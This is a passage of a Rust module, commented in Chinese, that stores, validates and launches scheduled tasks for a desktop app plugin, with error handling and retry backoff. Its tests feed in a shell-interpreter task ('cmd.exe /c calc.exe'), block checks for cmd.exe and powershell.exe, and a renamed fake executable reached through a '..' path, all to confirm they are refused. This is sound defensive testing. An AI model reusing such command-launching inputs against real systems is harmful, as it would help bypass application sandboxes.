        "UPDATE scheduled_tasks SET name=?1, target_path=?2, args=?3, schedule_type=?4, schedule_time=?5, enabled=?6, last_run=?7 WHERE id=?8",
        rusqlite::params![
            new_name, new_target, new_args, new_type, new_time,
            if new_enabled { 1 } else { 0 }, last_run, id
        ],
    )?;
    Ok(())
}

/// 删除任务。
///
/// `Ok(false)` 只在"库里确实没有这一条"时返回；库打不开 / 查询出错走 `Err`。
/// 这两件原先都返回 `false`，于是插件页对着一条**存在**的任务报"任务 #N 不存在"
/// （GUI 开着、库被它的写事务占满时就会这样），用户以为任务已经没了。
pub fn delete_task(id: i64) -> anyhow::Result<bool> {
    let conn = open().map_err(|e| anyhow::anyhow!("打开定时任务库失败: {e}"))?;
    conn.execute("DELETE FROM scheduled_tasks WHERE id=?1", [id])
        .map(|n| n > 0)
        .map_err(|e| anyhow::anyhow!("删除任务 #{id} 失败: {e}"))
}

/// 启用/禁用任务。
///
/// 契约与 [`delete_task`] 一致：`Ok(false)` 只在"库里确实没有这一条"时返回，
/// 库打不开 / UPDATE 失败走 `Err`。以前这里是 `let _ = ...` 且**什么都不返回**，
/// 于是宿主只能回 `Ok`：库被 GUI 的写事务占满时，插件页对着一条**存在**的任务
/// 报"已启用"而配置一个字没改（同一族的 `scheduler_delete`、插件「停用」都修过了，
/// 这是剩下的那条腿）。
pub fn toggle_task(id: i64, enabled: bool) -> anyhow::Result<bool> {
    let conn = open().map_err(|e| anyhow::anyhow!("打开定时任务库失败: {e}"))?;
    conn.execute(
        "UPDATE scheduled_tasks SET enabled=?1 WHERE id=?2",
        rusqlite::params![if enabled { 1 } else { 0 }, id],
    )
    .map(|n| n > 0)
    .map_err(|e| anyhow::anyhow!("更新任务 #{id} 的启用状态失败: {e}"))
}

/// 获取所有任务。
///
/// 读不出来时**必须留日志**：返回空列表与"他一条任务都没建过"在界面上长得一样，
/// 而插件页会直接显示成空列表。
pub fn get_all_tasks() -> Vec<ScheduledTask> {
    let conn = match open() {
        Ok(c) => c,
        Err(e) => {
            tracing::error!("定时任务读不出来（打开库失败），本次按空列表处理: {e}");
            return Vec::new();
        }
    };
    let mut stmt = match conn.prepare("SELECT * FROM scheduled_tasks ORDER BY id") {
        Ok(s) => s,
        Err(e) => {
            tracing::error!("定时任务读不出来（查询准备失败），本次按空列表处理: {e}");
            return Vec::new();
        }
    };
    let result = stmt.query_map([], |r| {
        // args 在 schema 里可空（Python 版遗留库、backup/ 还原、手改都会留下 NULL），
        // 读成 Option 再兜底。原来读成非 Option 的 String，NULL 行会解码失败，
        // 又被下面的 flatten() 静默丢掉 —— 那条任务连一条日志都没有就再也不触发。
        let id: i64 = r.get(0)?;
        Ok(ScheduledTask {
            id,
            name: r.get(1)?,
            target_path: r.get(2)?,
            args: r.get::<_, Option<String>>(3)?.unwrap_or_default(),
            schedule_type: r.get(4)?,
            schedule_time: r.get(5)?,
            enabled: r.get::<_, i64>(6)? != 0,
            last_run: r.get(7)?,
            created_at: r.get(8)?,
        })
    });
    let mut out: Vec<ScheduledTask> = Vec::new();
    let mut dropped: Vec<String> = Vec::new();
    match result {
        Ok(rows) => {
            for row in rows {
                match row {
                    Ok(t) => out.push(t),
                    Err(e) => dropped.push(e.to_string()),
                }
            }
        }
        Err(e) => {
            tracing::error!("定时任务读不出来（查询失败），本次按空列表处理: {e}");
            return Vec::new();
        }
    }
    // 逐行报错而不是整体吞掉：rusqlite 的错误串带列号与列名（如
    // `InvalidColumnType(3, "args", Null)`），够定位是哪一条、哪一列。
    for d in &dropped {
        tracing::error!(
            "定时任务有一行解不出来，已跳过（这条不会参与调度，请在插件页删掉重建）: {d}"
        );
    }
    out
}

/// 解析 interval 格式 'HH:MM-HH:MM|N'，返回 (start_min, end_min, interval)。
fn parse_interval(s: &str) -> Option<(i64, i64, i64)> {
    let (time_part, n_part) = s.split_once('|')?;
    let (start_str, end_str) = time_part.split_once('-')?;
    // 两个时刻走的是与 daily 同一个解析器。原来这里另写了一份闭包，而且那份
    // **不 trim**（外层 `parse_hhmm` trim 了）：于是 `validate_schedule` 先 trim 后判
    // 通过、入库的却是带空格的 `" 07:00-23:00|30"`，这里解析成 None ⇒
    // `should_run` 永远 false —— 一条看着合法、实际永不执行、也一行日志都没有的任务。
    let start = parse_hhmm(start_str)?;
    let end = parse_hhmm(end_str)?;
    let interval = digits_only(n_part.trim())?;
    if interval <= 0 || end < start {
        return None;
    }
    Some((start, end, interval))
}

/// 解析 'HH:MM' 为「当日第几分钟」；格式或范围不符一律 None。
///
/// 刻意不写成 `parse().unwrap_or(0)`：那种写法下 `"abc:xyz"` 等于 00:00，而
/// daily 的判定是 `now_min >= target_min`，于是"非法时间"实际含义是"任何时刻都该跑"，
/// 任务一入库就立刻启动目标程序。`"25:00"` 反过来永远跑不了。两种都比拒绝更糟。
fn parse_hhmm(s: &str) -> Option<i64> {
    let (h, m) = s.split_once(':')?;
    let (h, m) = (parse_clock_number(h.trim())?, parse_clock_number(m.trim())?);
    if !(0..=23).contains(&h) || !(0..=59).contains(&m) {
        return None;
    }
    Some(h * 60 + m)
}

/// 只认纯十进制（`+9`、`-0`、空白、任何非数字字符都是 None），溢出也 None。
///
/// 加这一层是因为 `"-0".parse::<i64>()` 是 `Ok(0)`、`"+9"` 是 `Ok(9)`：于是
/// `"-0:00"` 一路通过校验、存进库、被判成 00:00 —— 而 daily 的判据是
/// `now_min >= target_min`，"非法时间"就又变成"任何时刻都该跑"，任务落库后
/// 30 秒内启动目标程序（`parse_hhmm` 头那段防的是同一件事，只是从符号这个门进来）。
/// 面板那个时刻输入框是把 `el.value` 原样交下来的（`desktop/ui/js/main.js`），
/// 手抖多带一个 `-` 就进得来。
fn digits_only(s: &str) -> Option<i64> {
    if s.is_empty() || !s.bytes().all(|b| b.is_ascii_digit()) {
        return None;
    }
    s.parse().ok()
}

/// 时钟位（时 / 分）用的数字：纯十进制且最多两位。
///
/// 分钟**间隔**不这走这条：`07:00-23:00|120`、`|1440` 都是正当写法，
/// 那里只要求"纯十进制 + > 0"（见 `parse_interval`）。
fn parse_clock_number(s: &str) -> Option<i64> {
    if s.len() > 2 {
        return None;
    }
    digits_only(s)
}

/// 判断任务是否应执行（镜像 `_should_run`）。
/// 一次判定的结论。`Wait` 与 `BadConfig` 的分别是给日志用的：前者是正常的"还没到点"，
/// 后者是"这条任务永远不会到点"（配置根本解不开）。
#[derive(Debug)]
enum RunDecision {
    Run,
    Wait,
    BadConfig(String),
}

/// [`should_run`] 的判定过程。拆成两层的理由：原先四个"解不开"的臂都只
/// `return false`、一行日志都没有 —— 用户想知道"为什么这条任务从来不跑"只能翻源码。
fn run_check(t: &ScheduledTask, now: &chrono::DateTime<Local>) -> RunDecision {
    if !t.enabled {
        return RunDecision::Wait;
    }
    let now_min = now.hour() as i64 * 60 + now.minute() as i64;
    let last_run = t.last_run.as_deref();

    match t.schedule_type.as_str() {
        "daily" => {
            // 格式 HH:MM
            let target_min = match parse_hhmm(&t.schedule_time) {
                Some(v) => v,
                None => {
                    return RunDecision::BadConfig(format!(
                        "daily 的时刻「{}」不是 HH:MM",
                        t.schedule_time
                    ))
                }
            };
            if now_min < target_min {
                return RunDecision::Wait;
            }
            match last_run {
                Some(lr) => {
                    // 今天（或"比今天还晚"的那一次）已执行过则不重复。
                    //
                    // 判据原来是 `== now.date_naive()`，那把时钟**往回**跨过午夜这件事
                    // 变成放行器：任务在 10-02 09:00 跑过，随后时钟被调回 10-01 23:30
                    // （NTP 校正、手工对表、向东跨时区），`10-02 != 10-01` ⇒ 判定为
                    // "今天还没跑"，于是所有 daily 任务在回拨后的那一刻一起启动一遍；
                    // 而这一遍又把 `last_run` 盖成 10-01 23:30，等时钟真的走到 10-02
                    // 又会再启动一次 —— 一次回拨换来两次弹出。
                    // 与同文件 `interval` 那一支（用 `<` 放行、往回跳时算出负数于是闭嘴）
                    // 以及 `effective_last_run` 取两个戳里**较晚**的那个是同一个口径：
                    // 戳记只会来自过去，来自"未来"的那次一定已经跑过了。
                    if let Ok(lr_dt) = NaiveDateTime::parse_from_str(lr, "%Y-%m-%d %H:%M:%S") {
                        if lr_dt.date() >= now.date_naive() {
                            return RunDecision::Wait;
                        }
                    }
                    RunDecision::Run
                }
                None => RunDecision::Run,
            }
        }
        "once" => {
            // 格式 YYYY-MM-DD HH:MM
            let target = match NaiveDateTime::parse_from_str(&t.schedule_time, "%Y-%m-%d %H:%M") {
                Ok(dt) => dt,
                Err(_) => {
                    return RunDecision::BadConfig(format!(
                        "once 的时刻「{}」不是 YYYY-MM-DD HH:MM",
                        t.schedule_time
                    ))
                }
            };
            if now.naive_local() < target {
                return RunDecision::Wait;
            }
            if last_run.is_none() {
                RunDecision::Run
            } else {
                RunDecision::Wait
            }
        }
        "interval" => {
            let (start_min, end_min, interval) = match parse_interval(&t.schedule_time) {
                Some(v) => v,
                None => {
                    return RunDecision::BadConfig(format!(
                        "interval 的时刻「{}」不是 HH:MM-HH:MM|分钟数",
                        t.schedule_time
                    ))
                }
            };
            if now_min < start_min || now_min > end_min {
                return RunDecision::Wait;
            }
            match last_run {
                None => RunDecision::Run,
                Some(lr) => {
                    if let Ok(lr_dt) = NaiveDateTime::parse_from_str(lr, "%Y-%m-%d %H:%M:%S") {
                        if lr_dt.date() < now.date_naive() {
                            return RunDecision::Run;
                        }
                        // 同一天：检查间隔
                        let elapsed = now.naive_local().signed_duration_since(lr_dt).num_minutes();
                        if elapsed >= interval {
                            RunDecision::Run
                        } else {
                            RunDecision::Wait
                        }
                    } else {
                        RunDecision::Run
                    }
                }
            }
        }
        other => RunDecision::BadConfig(format!("调度类型「{other}」不是 daily/once/interval")),
    }
}

/// 一次启动尝试的结果。
///
/// 刻意分三态。原来 `execute_task` 返回 `Option<String>`，把"目标为空 / 被白名单拒绝"
/// （重试多少次都不会变好）与 `CreateProcess` 失败（休眠的 USB 盘、杀软首扫这类
/// **瞬时**问题）并成一件 —— 调用方拿不到这个区分，就只能对所有失败用同一套退避，
/// 于是"该再试的不再试、不该再试的每 30 秒试一次"两头都错。
#[derive(Debug)]
enum LaunchOutcome {
    /// 真的启动起来了，带回填 `last_run` 的时刻
    Fired(String),
    /// 永久拒绝：目标为空或不在白名单里
    Refused(String),
    /// 瞬时失败：目标此刻读不到，或进程创建本身没成功
    Transient(String),
}

/// 执行任务（启动目标程序，DETACHED_PROCESS）。
///
/// 只有 [`LaunchOutcome::Fired`] 意味着"这次真的启动了"；两个失败臂都无时刻。
/// 调用方（调度循环）按三态决定退避策略，见 [`check_loop`]。
fn execute_task(t: &ScheduledTask) -> LaunchOutcome {
    if t.target_path.is_empty() {
        return LaunchOutcome::Refused("目标路径为空".into());
    }
    // 先解析、再校验**解析出来的那个路径**，最后启动同一个路径 —— 见
    // [`approved_launch_target`]。
    let exe = match approved_launch_target(&t.target_path, &t.args) {
        Ok(p) => p,
        Err(e) => {
            // 这一支原先一律 `Refused`：一次瞬时 IO（休眠的 USB 盘、杀软首扫、网络盘
            // 开机没就绪）就让这条任务在整个进程生命周期里不再尝试 —— 而本文件
            // `LAUNCH_FAILURE_BACKOFF_AFTER` 的注释早就把这些情形写成"瞬时"。
            // 按错误类型分派（见 `TargetCurrentlyUnavailable`）。
            if e.downcast_ref::<TargetCurrentlyUnavailable>().is_some() {
                tracing::warn!(
                    "定时任务这次量不到目标（按瞬时处理，本时段内还会再试）: {} — {e}",
                    t.name
                );
                return LaunchOutcome::Transient(e.to_string());
            }
            tracing::warn!("定时任务被拒绝执行（{}）: {e}", t.name);
            return LaunchOutcome::Refused(e.to_string());
        }
    };
    let mut cmd = std::process::Command::new(&exe);
    if !t.args.is_empty() {
        // 与校验用的是同一个切分器：校验的是「带空格的一个路径」，启动时也必须
        // 把它当成一个 argv 传下去（Rust 会自己加引号）。
        for arg in split_args(&t.args) {
            cmd.arg(arg);
        }
    }
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        cmd.creation_flags(0x00000008); // DETACHED_PROCESS
    }
    match cmd.spawn() {
        Ok(_) => {
            tracing::info!("定时任务已执行: {} -> {}", t.name, exe.display());
            let now_str = Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
            // 写库失败也必须把"这次已经启动过"带回去。原来这里 `let _ =` 吞掉错误：
            // 库里 last_run 还是空 → 30 秒后 `should_run` 又说该跑 → 程序一遍遍地开，
            // 表现是"我设的定时任务弹了一窗口"。（库 BUSY 超过 15 秒、表不可用时就会这样。）
            if let Err(e) = open().and_then(|conn| {
                conn.execute(
                    "UPDATE scheduled_tasks SET last_run=?1 WHERE id=?2",
                    rusqlite::params![now_str.clone(), t.id],
                )
            }) {
                tracing::error!(
                    "定时任务已启动，但 last_run 没写进库（本进程内先记着，不会再启一次）: {e}"
                );
            }
            LaunchOutcome::Fired(now_str)
        }
        Err(e) => {
            tracing::error!("定时任务执行失败: {} -> {}: {e}", t.name, exe.display());
            LaunchOutcome::Transient(e.to_string())
        }
    }
}

/// 调度线程的检查间隔。
const CHECK_INTERVAL_MS: u64 = 30_000;

/// 同一个调度窗口内连续启动失败到这个次数就退到**下一个窗口**再试。
///
/// 留三次而不是立刻放弃：目标在休眠的 USB 盘上、被杀软扫第一个瞬间这类**瞬时**失败
/// 下一轮（30 秒后）多半就好了。烧满三次就在本窗口内停手：这类任务原来每 30 秒重试
/// 一次、每次一条 error，一天两万八千条，而且真的哪天忽然能启动就会在一个谁也没
/// 预期的时刻弹出来。
/// 刻意**不**写 `last_run`：那字段的语义是"执行过了"，插件页会把它显示成"上次执行"，
/// 拿一次失败的尝试去填等于对用户撒谎。
const LAUNCH_FAILURE_BACKOFF_AFTER: u32 = 3;

/// 一条任务的退避状态（只在进程内，重启即清零）。
#[derive(Debug)]
struct Backoff {
    /// 本窗口内已经烧掉的次数
    count: u32,
    /// 这份计数属于哪个调度窗口（见 [`backoff_window`]）
    window: String,
    /// 计数建立时这条任务的配置指纹（见 [`task_stamp`]）
    stamp: String,
    /// 被**永久**拒绝（目标为空/白名单外）：跨窗口也不重试，直到配置改动
    given_up: bool,
}

/// 配置指纹：目标、参数、调度类型、调度时刻里任何一样变了，老的失败计数与老的
/// "永久拒绝"判定就都不算数（用户在插件页改正了目标，就该重新试一次）。
/// `\u{1}` 作分隔符：路径与参数里不可能出现该字符，拼接不会与另一条配置撞车。
fn task_stamp(t: &ScheduledTask) -> String {
    format!(
        "{}\u{1}{}\u{1}{}\u{1}{}",
        t.target_path, t.args, t.schedule_type, t.schedule_time
    )
}

/// 这条任务此刻所处的调度窗口 —— 退避按窗口复位，粒度与 [`should_run`] 的判定对齐：
/// - `interval`：`"YYYY-MM-DD#第n步"`，一个 interval 步就是一个时段
/// - `daily` / `once` / 其余：日历日（"下一个时段" = 明天）
fn backoff_window(t: &ScheduledTask, now: &chrono::DateTime<Local>) -> String {
    let day = now.format("%Y-%m-%d").to_string();
    if t.schedule_type == "interval" {
        if let Some((start_min, _end_min, interval)) = parse_interval(&t.schedule_time) {
            let now_min = now.hour() as i64 * 60 + now.minute() as i64;
            let slot = (now_min - start_min).max(0) / interval.max(1);
            return format!("{day}#{slot}");
        }
    }
    day
}

/// 这一轮该不该跳过这条任务。窗口换了、配置改了都算重新武装。
fn in_backoff(seen: Option<&Backoff>, window: &str, stamp: &str) -> bool {
    match seen {
        None => false,
        Some(b) if b.stamp != stamp => false,
        Some(b) if b.given_up => true,
        Some(b) => b.count >= LAUNCH_FAILURE_BACKOFF_AFTER && b.window == window,
    }
}

/// 库里那次与本轮兜底记忆里取更新的一个（时间串是 `%Y-%m-%d %H:%M:%S`，定长，
/// 字典序即时间序）。
fn effective_last_run(db: Option<&str>, memo: Option<&str>) -> Option<String> {
    match (db, memo) {
        (Some(a), Some(b)) => Some(if a >= b { a.to_string() } else { b.to_string() }),
        (Some(a), None) => Some(a.to_string()),
        (None, Some(b)) => Some(b.to_string()),
        (None, None) => None,
    }
}

/// 后台检查循环。
///
/// 30 秒的间隔按 500ms 小片睡：`stop()` 置位后最多 500ms 就能退出，
/// 不必等满一整轮间隔（停用插件时若等它睡满，会把调用方挂住半分钟）。
/// 保证 `scheduled_tasks` 表存在，且**只在成功时落闩**。
///
/// `Scheduler::start()` 那一次失败不该钉死整个进程：数据目录可能在开机之后才出现
/// （USB / 网络盘 —— 会等它的人正是把数据放那种盘上的人）、杀软可能正占着 `-wal`、
/// 第二个实例正在退出。番茄钟与记账两条兄弟路径都是这个形状（`ensure_pomodoro_db`、
/// `ensure_accounting_db`），本文件此前只有"启动时试一次"。
///
/// 闩刻意做成调用方传进来的 `AtomicBool`（而不是进程级 static）：调度线程与
/// `start()` 各持一份克隆，测试能在自己的隔离目录里重跑这套判定。
fn ensure_schema_ready(ready: &AtomicBool) -> bool {
    if ready.load(Ordering::Relaxed) {
        return true;
    }
    match init_db() {
        Ok(()) => {
            ready.store(true, Ordering::Relaxed);
            true
        }
        Err(e) => {
            tracing::error!("定时任务表初始化失败，下次调用会重试: {e}");
            false
        }
    }
}

fn check_loop(stop: Arc<AtomicBool>, schema_ready: Arc<AtomicBool>) {
    // 两张只在本进程有效的兜底表（重启即清零，库里那份才是准）：
    // last_run 写库失败时记下的启动时刻、以及连续启动失败的次数。
    let mut fired_memo: std::collections::HashMap<i64, String> = std::collections::HashMap::new();
    let mut backoffs: std::collections::HashMap<i64, Backoff> = std::collections::HashMap::new();
    // 配置解不开的任务：每个调度窗口只说一次（30 秒一条会把日志本身刷成噪声，
    // 与本文件对退避日志的口径一致）
    let mut bad_config_window: std::collections::HashMap<i64, String> =
        std::collections::HashMap::new();
    while !stop.load(Ordering::SeqCst) {
        for _ in 0..(CHECK_INTERVAL_MS / 500) {
            if stop.load(Ordering::SeqCst) {
                return;
            }
            std::thread::sleep(Duration::from_millis(500));
        }
        // `start()` 那一次建表失败不该钉死一辈子（见 `ensure_schema_ready`）
        ensure_schema_ready(&schema_ready);
        let now = Local::now();
        let tasks = get_all_tasks();
        for task in &tasks {
            let window = backoff_window(task, &now);
            let stamp = task_stamp(task);
            if in_backoff(backoffs.get(&task.id), &window, &stamp) {
                continue;
            }
            // 条数就几条，克隆一份把兜底时刻套上去，比到处传参数好读
            let memo = fired_memo.get(&task.id).cloned();
            let mut t = task.clone();
            t.last_run = effective_last_run(task.last_run.as_deref(), memo.as_deref());
            match run_check(&t, &now) {
                RunDecision::Run => {
                    record_launch(&t, &mut fired_memo, &mut backoffs, &window, &stamp);
                }
                RunDecision::BadConfig(why) => {
                    if bad_config_window
                        .get(&task.id)
                        .map(|seen| *seen != window)
                        .unwrap_or(true)
                    {
                        tracing::warn!(
                            "定时任务 #{} 的调度配置解不开，它永远不会执行（{why}）；\
                             在插件页改正这一条的时刻即可恢复",
                            task.id
                        );
                        bad_config_window.insert(task.id, window.clone());
                    }
                }
                RunDecision::Wait => {}
            }
        }
    }
}

/// 启动一次并把结果记进两张兜底表。
fn record_launch(
    t: &ScheduledTask,
    fired_memo: &mut std::collections::HashMap<i64, String>,
    backoffs: &mut std::collections::HashMap<i64, Backoff>,
    window: &str,
    stamp: &str,
) {
    let outcome = execute_task(t);
    let fired_at = apply_attempt(backoffs, t.id, window, stamp, &outcome);
    if let Some(at) = fired_at {
        fired_memo.insert(t.id, at);
    }
}

/// 把一次尝试的结果记进退避表，返回"真的启动了"的时刻（没有启动则 `None`）。
///
/// 纯函数（不起进程、不碰库），三个臂都能单测。
fn apply_attempt(
    backoffs: &mut std::collections::HashMap<i64, Backoff>,
    id: i64,
    window: &str,
    stamp: &str,
    outcome: &LaunchOutcome,
) -> Option<String> {
    match outcome {
        LaunchOutcome::Fired(at) => {
            backoffs.remove(&id);
            return Some(at.clone());
        }
        LaunchOutcome::Refused(why) => {
            // 永久拒绝：跨窗口也不再试。计数直接给到阈值，省掉"还剩几次"这套歧义。
            tracing::warn!(
                "定时任务 #{id} 不再重试（{why}）；在插件页改正这条任务的目标后会重新试一次"
            );
            backoffs.insert(
                id,
                Backoff {
                    count: LAUNCH_FAILURE_BACKOFF_AFTER,
                    window: window.to_string(),
                    stamp: stamp.to_string(),
                    given_up: true,
                },
            );
        }
        LaunchOutcome::Transient(why) => {
            let b = backoffs.entry(id).or_insert(Backoff {
                count: 0,
                window: window.to_string(),
                stamp: stamp.to_string(),
                given_up: false,
            });
            // 窗口或配置换过 ⇒ 这份计数属于上一个时段，重新武装
            if b.window != window || b.stamp != stamp {
                b.count = 0;
                b.window = window.to_string();
                b.stamp = stamp.to_string();
                b.given_up = false;
            }
            b.count += 1;
            tracing::debug!("定时任务 #{id} 本时段第 {} 次启动没成功: {why}", b.count);
            if b.count == LAUNCH_FAILURE_BACKOFF_AFTER {
                tracing::warn!(
                    "定时任务 #{id} 连续 {} 次没能启动，本时段内不再重试，下一个时段再试一次；\
                     目标已卸载或不在白名单里的话，请直接删掉或改正这条任务",
                    b.count
                );
            }
        }
    }
    None
}

/// 后台调度线程句柄。
pub struct Scheduler {
    stop: Arc<AtomicBool>,
    handle: Mutex<Option<std::thread::JoinHandle<()>>>,
}

impl Scheduler {
    pub fn start() -> Arc<Self> {
        // 建表失败不再只是"记一笔然后放弃"：同一份闩交给调度线程，它每轮还会再试
        let schema_ready = Arc::new(AtomicBool::new(false));
        ensure_schema_ready(&schema_ready);
        let s = Arc::new(Self {
            stop: Arc::new(AtomicBool::new(false)),
            handle: Mutex::new(None),
        });
        let stop = Arc::clone(&s.stop);
        let handle = std::thread::Builder::new()
            .name("scheduler".into())
            .spawn(move || check_loop(stop, Arc::clone(&schema_ready)))
            .map_err(|e| tracing::error!("启动调度线程失败: {e}"))
            .ok();
        // spawn 失败时 .ok() 已经是 None：调度线程没起来，句柄留 None
        *s.handle.lock().unwrap_or_else(|e| e.into_inner()) = handle;
        // spawn 失败时上面已 error，别再谎报「已启动」
        if s.handle.lock().unwrap_or_else(|e| e.into_inner()).is_some() {
            tracing::info!("定时任务调度线程已启动");
        }
        s
    }

    /// 请求停止：置位后由调度线程自行在下一个 500ms 分片退出。
    ///
    /// 刻意不 `join()`：调用方是主线程（插件 cleanup），而线程此刻可能正在
    /// 拉起目标程序，等它会卡住界面。取走句柄即 detach。
    pub fn stop(&self) {
        self.stop.store(true, Ordering::SeqCst);
        let _ = self.handle.lock().unwrap_or_else(|e| e.into_inner()).take();
        tracing::info!("定时任务调度线程已请求停止");
    }
}

/// 调度描述（用于显示）。
pub fn describe_schedule(schedule_type: &str, schedule_time: &str) -> String {
    match schedule_type {
        "daily" => format!("每日 {schedule_time}"),
        "once" => format!("一次性 {schedule_time}"),
        "interval" => match parse_interval(schedule_time) {
            Some((s, e, n)) => {
                format!(
                    "每 {n} 分钟 ({:02}:{:02} ~ {:02}:{:02})",
                    s / 60,
                    s % 60,
                    e / 60,
                    e % 60
                )
            }
            None => format!("间隔执行（格式错误：{schedule_time}）"),
        },
        _ => format!("{schedule_type} {schedule_time}"),
    }
}

/// 校验调度配置。返回 (ok, error_msg)。
pub fn validate_schedule(schedule_type: &str, schedule_time: &str) -> (bool, String) {
    let t = schedule_time.trim();
    if t.is_empty() {
        return (false, "执行时间不能为空".into());
    }
    match schedule_type {
        "daily" => {
            let parts: Vec<&str> = t.split(':').collect();
            if parts.len() != 2 {
                return (false, "每日定时格式应为 HH:MM".into());
            }
            match parse_hhmm(t) {
                Some(_) => (true, String::new()),
                None => (false, "时间超出范围".into()),
            }
        }
        "once" => {
            if NaiveDateTime::parse_from_str(t, "%Y-%m-%d %H:%M").is_ok() {
                (true, String::new())
            } else {
                (false, "一次性格式应为 YYYY-MM-DD HH:MM".into())
            }
        }
        "interval" => {
            if parse_interval(t).is_some() {
                (true, String::new())
            } else {
                (false, "间隔执行格式应为 HH:MM-HH:MM|分钟数".into())
            }
        }
        _ => (false, format!("未知调度类型: {schedule_type}")),
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::TimeZone;

    /// 串行锁 + 隔离目录；返回值活着期间两者都在，离开作用域删目录。
    ///
    /// 原来只回锁不回目录，`ff_sched_*` 每个用例每跑一次就在 %TEMP% 留一份
    /// （调度器有 8 个用例 → 每轮 +8）。目录删除前先清只读连接池，
    /// 否则 Windows 下句柄未放，remove_dir_all 静默失败。
    /// 判定入口的布尔视图：产品侧只看 [`RunDecision`]（调度线程据此分派日志），
    /// 这里给既有那批"该不该跑"的用例留着原来的写法，别把它们全改一遍。
    fn should_run(t: &ScheduledTask, now: &chrono::DateTime<Local>) -> bool {
        matches!(run_check(t, now), RunDecision::Run)
    }

    fn isolate_app_dir(
        tag: &str,
    ) -> (std::sync::MutexGuard<'static, ()>, crate::paths::TestAppDir) {
        let lock = crate::paths::test_app_dir_lock();
        let dir = crate::paths::test_app_dir(&format!("sched_{tag}"));
        let _ = crate::config::instance();
        // 生产路径上 `Scheduler::start()` 一定会先建表，隔离目录里没有这一步时
        // 任何"成功入库"的写法都会撞上 no such table。
        let _ = init_db();
        (lock, dir)
    }

    /// 回归：插件可通过 `scheduler_add` 启动任意程序，绕过 io/os 沙箱。
    /// 解释器与系统二进制必须在白名单校验处被拒绝。
    #[test]
    fn blocked_interpreters_are_rejected() {
        let _g = isolate_app_dir("blocked");
        // 目标文件确实存在（否则会先被"不存在"分支拦下，测不到黑名单逻辑）
        let cmd = r"C:\Windows\System32\cmd.exe";
        if !std::path::Path::new(cmd).is_file() {
            return; // 非 Windows 或无该系统路径：跳过
        }
        assert!(
            validate_task_target(cmd).is_err(),
            "cmd.exe 绝不能作为定时任务目标"
        );
        assert!(
            validate_task_target(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe")
                .is_err(),
            "powershell.exe 绝不能作为定时任务目标"
        );

        // 入口（add_task）必须同样拒绝，且不产生任何记录
        let e = add_task("evil", cmd, "/c calc.exe", "once", "2000-01-01 00:00", true)
            .expect_err("被拒绝的任务不应返回有效 id");
        assert!(
            e.to_string().contains("禁止") || e.to_string().contains("白名单"),
            "原因要说清楚为什么被拒，实得: {e}"
        );
        assert!(get_all_tasks().is_empty(), "被拒绝的任务不应入库");
    }

    /// 启用/禁用必须分得清"改成没改成"。以前 `toggle_task` 是 `let _ = ...` 且什么都不
    /// 返回，宿主那一层只能恒回成功 —— 于是库被写事务占满时，插件页对着一条**存在**的
    /// 任务报"已启用"而配置一个字没改（`scheduler_delete`、插件「停用」都修过这一族，
    /// 这是剩下的那条腿）。三条腿要分开：真改成 / 没这一条 / 库开不出来。
    #[test]
    fn toggle_separates_changed_missing_and_unwritable() {
        let _g = isolate_app_dir("toggle_contract");
        // ① 库里没有这一条 → Ok(false)，既不是 Err 也不是"成功"
        assert!(
            !toggle_task(999_999, true).unwrap(),
            "不存在的 id 不该被报成改成功"
        );

        // 直接插一行，不走 add_task：它要求目标存在且在白名单内，而这里既不关心目标
        // 校验，也不想给任何游离的调度线程留下真去启动进程的机会。
        {
            let conn = open().unwrap();
            conn.execute(
                "INSERT INTO scheduled_tasks (id, name, target_path, args, schedule_type, \
                 schedule_time, enabled, last_run, created_at) \
                 VALUES (424242, 't', ?1, '', 'daily', '23:59', 0, NULL, '2026-01-01T00:00:00')",
                [r"C:\focusflow-test-dir\不存在的目标.exe"],
            )
            .unwrap();
        }
        // ② 真存在 → Ok(true)，且状态确实写进了库
        assert!(toggle_task(424242, true).unwrap(), "改成了就该回 true");
        assert!(
            get_all_tasks().iter().any(|t| t.id == 424242 && t.enabled),
            "报 true 就得真的落库"
        );
        assert!(toggle_task(424242, false).unwrap());
        assert!(
            get_all_tasks().iter().any(|t| t.id == 424242 && !t.enabled),
            "反向也要能改回去"
        );

        // ③ 库根本开不出来 → Err，且原因说清是"打不开库"（不能说成"没这条任务"）
        let path = db_path();
        let _ = std::fs::remove_file(&path);
        for suffix in ["-wal", "-shm"] {
            let _ = std::fs::remove_file(format!("{}{}", path.display(), suffix));
        }
        std::fs::create_dir_all(&path).expect("把库路径换成一个目录，open 就该失败");
        let e = toggle_task(424242, true).expect_err("库打不开必须是 Err");
        assert!(
            e.to_string().contains("打开定时任务库失败"),
            "应说明是打不开库，而不是任务不存在，实际: {e}"
        );
    }

    /// 白名单外的普通程序也会被拒绝（默认只放行常见用户应用）。
    #[test]
    fn non_whitelisted_binary_is_rejected() {
        let _g = isolate_app_dir("notlisted");
        let weird = r"C:\Windows\System32\where.exe";
        if !std::path::Path::new(weird).is_file() {
            return;
        }
        assert!(validate_task_target(weird).is_err());
    }

    /// 白名单内的目标 + 合法路径仍可通过（确保收敛没有把功能改死）。
    #[test]
    fn whitelisted_notepad_is_accepted() {
        let _g = isolate_app_dir("notepad");
        let notepad = r"C:\Windows\notepad.exe";
        if !std::path::Path::new(notepad).is_file() {
            return;
        }
        assert!(validate_task_target(notepad).is_ok());
    }

    /// 回归：只比对文件名等于允许把任意程序改名成 `calc.exe` 丢进临时目录。
    /// canonicalize 后必须同时校验来源目录，且 `..\` 写法不能成为漏网或误杀。
    #[test]
    fn renamed_copy_in_untrusted_dir_is_rejected() {
        let _g = isolate_app_dir("untrusted");
        let Some(windir) = std::env::var_os("WINDIR") else {
            return; // 无系统目录概念（非 Windows）
        };
        let windir = windir.to_string_lossy().to_string();
        let dir = std::env::temp_dir().join(format!("ff_sched_untrusted_{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let fake = dir.join("calc.exe");
        std::fs::write(&fake, b"MZ\x90\x00not a real calculator").unwrap();

        let e = validate_task_target(&fake.to_string_lossy())
            .expect_err("改名成白名单名字、但位于临时目录的程序必须被拒绝");
        assert!(
            e.to_string().contains("不在系统安装目录"),
            "错误信息应说明被拒原因，实际: {e}"
        );
        // 同一文件换成 `..\` 写法同样被拦：证明校验的是解析后的真实位置
        let smuggled = dir.join("..").join("calc.exe");
        assert!(validate_task_target(&smuggled.to_string_lossy()).is_err());

